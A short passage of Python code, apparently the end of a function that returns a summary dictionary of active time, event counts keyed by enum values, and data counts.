            "active_time": active_time
        },
        "event_counts": {k.value: v for k, v in event_counts.items()},
        "data_counts": data_counts
    }
